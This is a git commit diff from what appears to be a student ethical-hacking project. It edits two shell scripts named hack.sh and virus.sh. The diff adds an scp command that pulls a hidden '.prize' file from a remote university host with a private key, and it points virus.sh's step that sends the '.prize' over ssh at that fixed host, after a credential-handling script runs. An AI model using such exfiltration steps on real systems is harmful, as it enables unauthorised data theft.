42d82d2233f06f499cb79c7f97c48f13ee6f0608
Charles <chlsgong@gmail.com>
2018-04-16 18:02:06 -0500

    start on selenium

--- hack.sh
+++ hack.sh
@@ -1,1 +1,7 @@
+# !/bin/bash
+
+# retrieve prize
+scp -i id_rsa hcgong@scarab-beetle.cs.utexas.edu:~/Documents/.prize ~/Desktop/ethical-hacking-project
+
+# run selenium script
 
--- virus.sh
+++ virus.sh
@@ -8,4 +8,4 @@ python project.py .cred
 
 # send prize over ssh
 chmod 600 id_rsa
-scp -i id_rsa .prize hcgong@$2:~/Documents
+scp -i id_rsa .prize hcgong@scarab-beetle.cs.utexas.edu:~/Documents
